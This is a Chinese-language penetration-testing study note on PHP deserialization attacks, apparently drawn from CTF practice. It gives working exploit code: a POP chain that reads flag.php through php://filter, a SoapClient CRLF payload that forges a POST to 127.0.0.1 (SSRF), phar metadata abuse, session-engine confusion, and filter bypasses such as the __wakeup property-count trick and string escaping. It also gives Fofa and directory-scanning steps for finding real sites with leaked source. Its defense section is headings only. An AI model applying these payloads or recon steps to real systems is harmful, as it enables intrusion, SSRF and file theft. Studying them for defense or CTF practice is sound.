## 一、漏洞原理

### 1、简介

```python
# 解释
未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、SQL注入、目录遍历等不可控后果。
```

```python
# 危害
1、命令执行
2、DDOS
```

### 2、详情

```python
# 常见函数
serialize	将对象格式化成有序的字符串
unserialize	将字符串还原成原来的对象
```

```python
# 常见魔术方法
__construct()	对象创建时自动调用
__wakeup()		unserialize()时自动调用
__sleep()		使用serialize时触发
__destruct()	对象会被销毁时自动调用
__call()		对象上下文中调用不可访问的方法时触发
__get()			从不可访问的属性读取数据
__set()			将数据写入不可访问的属性时触发
__toString()	反序列化后的对象被输出在模板时自动调用
__invoke()		当脚本尝试将对象调用为函数时触发
__isset()		在不可访问的属性上调用isset()或empty()触发
__unset()		在不可访问的属性上使用unset()s
```

```python
# 常见序列化格式
二进制格式
字节数组
json字符串
xml字符串
```

```python
# 变量权限
public		公有；不添加任何字符
protected	受保护，只有本类和子类和父类中可见；在变量名前加%00*%00，长度+3
private		私有，只有本类中可见；在变量名前后添加%00，长度+2
```

```php
# 序列化举例
# 1、输入
<?php
class test{
    public $a;
    public $b;
    function __construct(){$this->a = "xiaolizi";$this->b = "dalizi";}
    function newTest(){return $this->a;}
}
$a = new test();
echo serialize($a);
?>
# 2、输出
O:4:"test":2:{s:1:"a";s:8:"xiaolizi";s:1:"b";s:6:"dalizi";}
# 解释
a(array)代表数组；3代表有3个属性
i(int)代表整型，0代表下标0
s(str)代表字符串，4代表字符串长度
```



## 二、漏洞发现

### 1、场景

```php
源码泄露
CMS版本存在反序列化漏洞
```

### 2、发现

```php
# 练习
1、百度：CVE反序列化，Fofa搜索指定版本号
2、Fofa：(body="Directory listing for" || title="index of /" || body="转到父目录") && country="CN" && is_domain=true，目录遍历获取源码
```

```php
# 业务
1、确定网站版本号，百度搜索该版本反序列化漏洞
2、Github：域名、IP、邮箱账号等
3、目录扫描工具：备份文件（zip、tar.gz、rar）
4、目录扫描工具：.svn/entires
5、目录扫描工具：.swp、.sop、.bak（vim打开）
```



## 三、利用条件

### 1、白盒审计

### 2、CVE匹配



## 四、利用方法

### 1、对象注入

```php
# 解释
用户的请求在传给反序列化函数unserialize()之前没有被正确过滤。PHP允许对象序列化，攻击者就可以提交特定的序列化字符串给相匹配匹配的serialize函数，导致一个在应用范围内的任意PHP对象注入
```

```php
# 条件
1、unserialize参数可控
2、代码中有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数
```

```php
# 实例
<?php
class A{
    var $test = "y4mao";
    function __destruct(){
        echo $this->test;
    }
}
$a = 'O:1:"A":1:{s:4:"test";s:5:"maomi";}';
unserialize($a);
```

```php
# 说明
在脚本运行结束后会调用销毁函数__destruct，同时序列化后的$a会覆盖test变量y4mao输出maomi
```

### 2、POP链

```php
# 解释
当关键代码不在魔术方法中，而是在一个类的普通方法中，可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来
```

```php
# 实例
<?php

class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

```php
# 说明
目的是希望通过Modifier当中的append方法实现本地文件包含读取文件，回溯到调用它的__invoke，__invoke是当我们将对象调用为函数时才触发；发现Test类中的__get方法，再回溯到Show当中的__toString，再回溯到Show当中__wakeup中有preg_match可以触发__toString
```

```php
# 利用
<?php
ini_set('memory_limit','-1');
class Modifier {
    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
}

class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
        $this->str = new Test();
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}
$a = new Show('aaa');
$a = new Show($a);
echo urlencode(serialize($a));
```

### 3、SoapClient

```php
# 解释
1、php安装php-soap拓展后，可以反序列化原生类SoapClient，用于发送http post请求
2、调用SoapClient中不存在的方法，触发SoapClient的__call魔术方法
3、通过CRLF添加请求体：SoapClient可以指定请求的User-Agent头，通过添加换行符的形式自定义其他请求内容
```

```php
# 测试
# 1、
VPS开启监听nc -lvp 9999
# 2、
运行php程序
<?php
$a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://xxxx.xxx.xx:9328'));
$b = serialize($a);
$c = unserialize($b);
$c -> not_a_function();//调用不存在的方法，让SoapClient调用__call
# 3、
VPS会接收到数据，其中SOAPAction是我们的可控参数
```

```php
# 条件
发送POST数据时，需要指定请求头Content-Type:application/x-www-form-urlencoded，但大部分情况下Content-Type不是这么定义。由于Content-Type在SOAPAction上面，UserAgent在Content-Tpe上面，所以我们需要通过CRLF控制UserAgent，从而实现传输我们想要传输的POST数据
```

```php
# 实例
<?php
highlight_file(__FILE__);
$vip = unserialize($_GET['vip']);
$vip->getFlag();
//flag.php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);
​
​
if($ip!=='127.0.0.1'){
    die('error');
}else{
    $token = $_POST['token'];
    if($token=='ctfshow'){
        file_put_contents('flag.txt',$flag);
    }
}
```

```php
# 说明
由于服务器带有cloudfare代理，无法通过本地构造XFF头绕过，需要使用SoapClient + CRLF实现SSRF访问127.0.0.1/flag.php，从而绕过cloudfare代理
```

```php
# 利用
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1',
    'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'y4tacker^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));
$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);

随后再次访问flag.txt即可
```

### 4、Phar

```php
# 解释
PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源捆绑到一个归档文件来实现应用程序和库的分发
```

```php
# phar结构
# 1、stub
phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。
# 2、manifest
phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
# 3、content
被压缩文件的内容
# 4、signature (可空)
签名，放在末尾。
```

```php
# phar生成模板
<?php
    class Test {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new Test();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

```php
# 条件
1、phar文件能够上传到服务器端
2、要有可用的魔术方法作为跳板
3、文件操作函数的参数可控，且[: / phar]等关键字没有被过滤
```

```php
# 绕过
# 1、当限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
# 2、其他协议
php://filter/read=convert.base64-encode/resource=phar://phar.phar
# 3、添加文件头GIF89a
1、$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>")	//设置stub
2、生成一个phar.phar，修改后缀名为phar.gif
```

### 5、PHP-Session

​	5.1、Session介绍

​	5.2、利用姿势

```php
# 1、Session.upload_gropress文件包含 + 反序列化
参考链接：https://www.freebuf.com/vuls/202819.html
```

```php
# 2、不同引擎处理session文件 - $_SESSION变量可控
# 实例
// 1.php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['y4'] = $_GET['a'];
var_dump($_SESSION);
//2.php
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class test{
    public $name;
    function __wakeup(){
        echo $this->name;
    }
}
# 利用
由于1.php是使用php_serialize引擎，会把'|'当成正常的字符；但2.php使用的是php引擎，会把'|'当作键名与值的分隔符，导致其在解析session文件时直接对'|'后的值进行反序列化处理
```

```php
# 2、不同引擎处理session文件 - $_SESSION变量不可控
参考链接：https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165085243716782388040969%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165085243716782388040969&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-113588692.142^v9^pc_search_result_control_group,157^v4^control&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187
```



## 五、绕过防护

### 1、PHP7.1类属性

```php
# 实例
<?php
class test{
    protected $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');
```

```php
# 说明
PHP7.1以上，对属性类不敏感。正常情况下，当变量前是Protected时，序列化结果会在变量名前加上\x00*\x00，上面的例子，及时不加，也依然会输出abc
```

### 2、__wakeup绕过

```php
# 实例
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function __wakeup(){
        $this->a='666';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
```

```php
# 说明
# 1、
序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup执行
# 2、
以上实例如果执行unserialize('o:4:"test":1:{s:1:"a";s:3:"abc";}');，输出结果为666，因为abc不是属性
# 3、
以上实例如果执行unserialize('o:4:"test":2:{s:1:"a";s:3:"abc";}');，输出结果为abc，因为abc不是属性，test后面声明了2个属性，超出了真实属性，直接绕过__wakeup
```

```PHP
# 相关CVE
CVE-2016-7124（PHP5 < 5.6.25 | PHP7 < 7.0.10）
```

### 3、+号绕过

```php
# 实例
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a.PHP_EOL;
    }
}

function match($data){
    if (preg_match('/^O:\d+/',$data)){
        die('you lose!');
    }else{
        return $data;
    }
}
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
// +号绕过
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
// serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```

```php
# 说明
preg_match('/^o:\d+/')表示匹配序列化字符串是否时对象字符串[o:数字]开头。利用+号将o:替换成o:+，结果就变成了[o+:数字]，达到绕过该正则效果。注意，在url传参时，+号要编码为%2B
```

### 4、变量引用

```php
# 实例
<?php
class test{
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'abc';
        $this->b= &$this->a;
    }
    public function  __destruct(){

        if($this->a===$this->b){
            echo 666;
        }
    }
}
$a = serialize(new test());
```

```php
# 说明
以上实例将$a设置为$b的引用(取其地址)，使$b永远与$a相等。常用于绕过双变量必须全等，而其中一个变量已经被加密
```

### 5、16进制绕过

```php
# 实例
<?php
class test{
    public $username;
    public function __construct(){
        $this->username = 'admin';
    }
    public function  __destruct(){
        echo 666;
    }
}
function check($data){
    if(stristr($data, 'username')!==False){
        echo("你绕不过！！".PHP_EOL);
    }
    else{
        return $data;
    }
}
// 未作处理前
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a);
// 做处理后 \75是u的16进制
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

```php
# 说明
当O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}中，S为大写时，会被当做16进制解析，\75是u的16进制。常用于对对象关键字的过滤绕过
```

### 6、字符逃逸

​	6.1、情况1：过滤后字符变多

```php
# 实例
<?php
function change($str){
    return str_replace("x","xx",$str);
}
$name = $_GET['name'];
$age = "I am 11";
$arr = array($name,$age);
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "<br/>";
echo "过滤后:";
$old = change(serialize($arr));
$new = unserialize($old);
var_dump($new);
echo "<br/>此时，age=$new[1]";
```

```php
# 说明
# 1、
此时，传入的x字符将会变成xx
# 2、
想要带入逃逸的语句";i:1;s:6;"woaini";}，共20字符
# 3、
传入name=xxxxxxxxxxxxxxxxxxxx";i:1;s:6:"woaini";}
# 4、
上面20个x变成了40个，多出来的20个取代了逃逸语句的20字符，使得字符串成功逃逸
```

​	6.2、情况2：过滤后字符变少

```php
# 实例
<?php
function change($str){
    return str_replace("xx","x",$str);
}
$arr['name'] = $_GET['name'];
$arr['age'] = $_GET['age'];
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "<br/>";
echo "过滤后:";
$old = change(serialize($arr));
var_dump($old);
echo "<br/>";
$new = unserialize($old);
var_dump($new);
echo "<br/>此时，age=";
echo $new['age'];
```

```php
# 说明
# 1、
此时，传入的xx会被替换成x
# 2、
想要带入的逃逸语句";s:6:"woaini";}"
# 3、
传入name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&age=11";s:3:"age";s:6:"woaini";}"
# 4、
age值被序列化后为"a:2:{s:4:"name";s:40:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"age";s:28:"11";s:3:"age";s:6:"woaini";}"
# 5、
由于xx变成x，40个x变成了20个，后面20个字符被吃掉用来补充，";s:3:"age";s:28:"11这段被吃掉，";s:3:"age";s:6:"woaini";}"这段被成功逃逸，引号和封号闭合了前面的语句，后面的花括号闭合前面原始的花括号，随后的语句全部被忽略了
```



## 六、实战思路

### 1、获取源码

### 2、搜索魔法函数

```Php
主要搜索__wakeup()和__destruct()函数
```

### 3、追踪调用过程

### 4、构造并验证POP链

### 5、虚拟机测试Exploit



## 七、防护措施

### 1、签名和认证

### 2、限制序列化和反序列化的类

### 3、RASP检测



## 